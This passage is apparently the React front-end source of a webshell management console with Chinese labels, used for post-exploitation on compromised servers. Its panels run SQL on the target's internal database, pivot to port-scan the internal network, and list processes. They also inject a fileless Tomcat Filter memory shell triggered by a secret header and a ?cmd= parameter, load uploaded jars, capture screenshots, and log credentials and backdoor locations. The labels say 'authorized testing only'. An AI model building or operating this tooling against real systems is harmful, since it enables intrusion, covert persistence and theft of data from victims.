      <textarea className="h-16 w-full rounded border border-zinc-700 bg-zinc-800 p-2 font-mono text-xs text-zinc-200" value={sql} onChange={(e) => setSql(e.target.value)} placeholder="SQL（目标机执行——直连其内网数据库）" />
      <DBtn onClick={run} disabled={busy}><PlayIcon className="size-3.5" /> 执行</DBtn>
      {err && <div className="rounded border border-amber-800 bg-amber-950/40 p-1.5 font-mono text-xs text-amber-400">{err}</div>}
      {result && (
        <div className="max-h-64 overflow-auto rounded border border-zinc-700">
          <table className="w-full text-xs">
            <thead className="sticky top-0 bg-zinc-800"><tr className="text-left text-zinc-400">{result.columns.map((c) => <th key={c} className="py-1 pl-2">{c}</th>)}</tr></thead>
            <tbody>
              {result.rows.map((row, i) => (
                <tr key={i} className="border-b border-zinc-800">
                  {result.columns.map((c) => <td key={c} className="truncate py-1 pl-2 font-mono text-zinc-300" title={String(row[c])}>{String(row[c])}</td>)}
                </tr>
              ))}
              {result.rows.length === 0 && <tr><td colSpan={result.columns.length || 1} className="py-3 text-center text-zinc-500">{result.affected !== undefined ? `影响 ${result.affected} 行` : "无结果"}</td></tr>}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

// ---------- 内网探测 ----------

function NetPanel({ target }: { target: WSTarget }) {
  const [host, setHost] = React.useState("127.0.0.1");
  const [ports, setPorts] = React.useState("80,443,3306,6379,8080,8888");
  const [out, setOut] = React.useState("");
  const { busy, ext, exec } = useRunner(target);

  const scan = async () => {
    const r = await ext("net_scan", { scan_host: host, scan_ports: ports });
    if (!r.ok) return setOut("[失败] " + r.error);
    try {
      const j = JSON.parse(r.output.trim());
      setOut(`目标 ${j.host} 开放端口：${(j.open || []).join(", ") || "无"}`);
    } catch { setOut(r.output); }
  };
  const netstat = async () => {
    const r = await exec("exec", { cmd: target.script_type === "php" ? "netstat -antp 2>/dev/null || netstat -an" : "netstat -ano" });
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };

  return (
    <div className="space-y-2 text-sm">
      <div className="text-xs text-zinc-500">以目标机为跳板探测其内网（授权测试）。</div>
      <div className="flex gap-1">
        <DInput placeholder="目标 host/IP" value={host} onChange={(e) => setHost(e.target.value)} />
        <DInput placeholder="端口（逗号/区间）" value={ports} onChange={(e) => setPorts(e.target.value)} />
        <DBtn onClick={scan} disabled={busy}><PlayIcon className="size-3.5" /> 扫描</DBtn>
        <DBtn onClick={netstat} disabled={busy}>netstat</DBtn>
      </div>
      <DPre>{out || "（结果）"}</DPre>
    </div>
  );
}

// ---------- 进程管理 ----------

function ProcPanel({ target }: { target: WSTarget }) {
  const [rows, setRows] = React.useState<{ name: string; pid: string; mem?: string; state?: string }[]>([]);
  const [raw, setRaw] = React.useState("");
  const { busy, ext, exec } = useRunner(target);

  const list = async () => {
    if (target.script_type === "php") {
      const r = await ext("proc_list", {});
      if (!r.ok) return setRaw("[失败] " + r.error);
      try {
        const j = JSON.parse(r.output.trim());
        setRows((j.procs || []).map((p: { name: string; pid: string | number; mem?: string; state?: string }) => ({ name: p.name, pid: String(p.pid), mem: p.mem, state: p.state })));
      } catch { setRaw(r.output); }
    } else {
      const r = await exec("exec", { cmd: "tasklist 2>/dev/null || ps aux" });
      setRaw(r.ok ? r.output : "[失败] " + r.error);
    }
  };

  return (
    <div className="space-y-2 text-sm">
      <DBtn onClick={list} disabled={busy}><RefreshCw className={`size-3.5 ${busy ? "animate-spin" : ""}`} /> 刷新进程列表</DBtn>
      {rows.length > 0 ? (
        <div className="max-h-96 overflow-auto rounded border border-zinc-700">
          <table className="w-full text-xs">
            <thead className="sticky top-0 bg-zinc-800"><tr className="text-left text-zinc-400"><th className="py-1 pl-2">PID</th><th>名称</th><th>内存/状态</th></tr></thead>
            <tbody>
              {rows.map((p, i) => (
                <tr key={i} className="border-b border-zinc-800">
                  <td className="py-1 pl-2 font-mono text-zinc-300">{p.pid}</td>
                  <td className="font-mono text-zinc-200">{p.name}</td>
                  <td className="text-zinc-500">{p.mem || p.state || "-"}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      ) : raw ? <DPre>{raw}</DPre> : <div className="py-6 text-center text-xs text-zinc-500">（点刷新获取）</div>}
    </div>
  );
}

// ---------- 内存马 ----------

function MemshellPanel({ target }: { target: WSTarget }) {
  const [filterName, setFilterName] = React.useState("forangGate");
  const [gateHeader, setGateHeader] = React.useState("X-Forang");
  const [gateValue, setGateValue] = React.useState("go");
  const [out, setOut] = React.useState("");
  const { busy, ext } = useRunner(target);

  const inject = async () => {
    const r = await ext("memshell_add_filter", { filter_name: filterName, gate_header: gateHeader, gate_value: gateValue });
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  const list = async () => {
    const r = await ext("memshell_list", {});
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  const remove = async () => {
    const n = window.prompt("要移除的 Filter 名", filterName);
    if (!n) return;
    const r = await ext("memshell_del", { filter_name: n });
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };

  return (
    <div className="space-y-2 text-sm">
      <div className="rounded border border-amber-800 bg-amber-950/40 p-2 text-xs text-amber-400">
        Tomcat Filter 内存马（godzilla 姿势）：注入后无文件驻留、重启失效。触发：带 <code>{`Header: ${gateHeader}: ${gateValue}`}</code> 访问任意 URL 加 <code>?cmd=命令</code>。仅授权测试。
      </div>
      <div className="grid grid-cols-3 gap-1">
        <DInput placeholder="Filter 名" value={filterName} onChange={(e) => setFilterName(e.target.value)} />
        <DInput placeholder="触发头名" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} />
        <DInput placeholder="触发头值" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
      </div>
      <div className="flex gap-1">
        <DBtn onClick={inject} disabled={busy} className="!bg-red-900/60 hover:!bg-red-800">注入内存马</DBtn>
        <DBtn onClick={list} disabled={busy}>枚举 Filter</DBtn>
        <DBtn onClick={remove} disabled={busy}>移除</DBtn>
      </div>
      <DPre>{out || "（操作结果）"}</DPre>
    </div>
  );
}

// ---------- Servlet ----------

function ServletPanel({ target }: { target: WSTarget }) {
  const [out, setOut] = React.useState("");
  const { busy, ext } = useRunner(target);
  const list = async () => {
    const r = await ext("servlet_list", {});
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  return (
    <div className="space-y-2 text-sm">
      <DBtn onClick={list} disabled={busy}><RefreshCw className={`size-3.5 ${busy ? "animate-spin" : ""}`} /> 枚举 Servlet / Filter</DBtn>
      <DPre>{out || "（结果 JSON：servlets/filters 注册与映射）"}</DPre>
    </div>
  );
}

// ---------- Jar ----------

function JarPanel({ target }: { target: WSTarget }) {
  const [out, setOut] = React.useState("");
  const { busy, ext } = useRunner(target);
  const upload = () => {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.accept = ".jar";
    inp.onchange = async () => {
      const f = inp.files?.[0];
      if (!f) return;
      const b64 = await new Promise<string>((res) => {
        const fr = new FileReader();
        fr.onload = () => res(String(fr.result).split(",")[1] || "");
        fr.readAsDataURL(f);
      });
      const r = await ext("jar_load", { jar_b64: b64 });
      setOut(r.ok ? r.output : "[失败] " + r.error);
    };
    inp.click();
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="text-xs text-zinc-500">上传 jar 到目标机临时目录并 URLClassLoader 装载（配合内存马/利用链）。</div>
      <DBtn onClick={upload} disabled={busy}><FolderUpIcon className="size-3.5" /> 选择 jar 上传加载</DBtn>
      <DPre>{out || "（结果）"}</DPre>
    </div>
  );
}

// ---------- 远程屏幕 ----------

function ShotPanel({ target }: { target: WSTarget }) {
  const [img, setImg] = React.useState("");
  const { busy, ext } = useRunner(target);
  const shot = async () => {
    const r = await ext("screenshot", {});
    if (!r.ok || !r.data_b64) return void window.alert(r.ok ? "无图像数据（服务器无桌面会话）" : r.error);
    setImg(`data:image/png;base64,${r.data_b64}`);
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="text-xs text-zinc-500">java.awt.Robot 截取目标服务器屏幕（无头服务器报 HeadlessException）。</div>
      <DBtn onClick={shot} disabled={busy}><CameraIcon className="size-3.5" /> 截图</DBtn>
      {img && (
        <div>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img src={img} alt="目标屏幕" className="max-h-96 rounded border border-zinc-700" />
          <a href={img} download="screenshot.png" className="text-xs text-blue-400 hover:underline">下载 PNG</a>
        </div>
      )}
    </div>
  );
}

// ---------- PHP 工具 ----------

function PHPToolPanel({ target }: { target: WSTarget }) {
  const [out, setOut] = React.useState("");
  const { busy, ext } = useRunner(target);
  const run = async (op: string) => {
    const r = await ext(op, {});
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  const scan = async () => {
    const root = window.prompt("扫描根目录（留空=DOCUMENT_ROOT）", "");
    const r = await ext("php_scan", { src_path: root || "" });
    setOut(r.ok ? r.output : "[失败] " + r.error);
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="flex flex-wrap gap-1">
        <DBtn onClick={() => run("php_info")} disabled={busy}>PHP 信息</DBtn>
        <DBtn onClick={() => run("php_writedirs")} disabled={busy}>可写目录</DBtn>
        <DBtn onClick={scan} disabled={busy}>WebShell 扫描</DBtn>
      </div>
      <DPre>{out || "（结果 JSON：phpinfo 摘要 / 可写目录 / 可疑文件）"}</DPre>
    </div>
  );
}

// ---------- 笔记 ----------

function NotePanel({ target }: { target: WSTarget }) {
  const [note, setNote] = React.useState(target.note || "");
  const [saved, setSaved] = React.useState(false);
  const save = async () => {
    await api.wsTargetSave({ ...target, note });
    setSaved(true);
    setTimeout(() => setSaved(false), 1500);
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="text-xs text-zinc-500">会话笔记（跟随目标保存：接管路径/凭据/后门位置）。</div>
      <textarea className="h-48 w-full rounded border border-zinc-700 bg-zinc-800 p-2 text-xs text-zinc-200" value={note} onChange={(e) => setNote(e.target.value)} />
      <DBtn onClick={save}>{saved ? "已保存 ✓" : "保存笔记"}</DBtn>
    </div>
  );
}
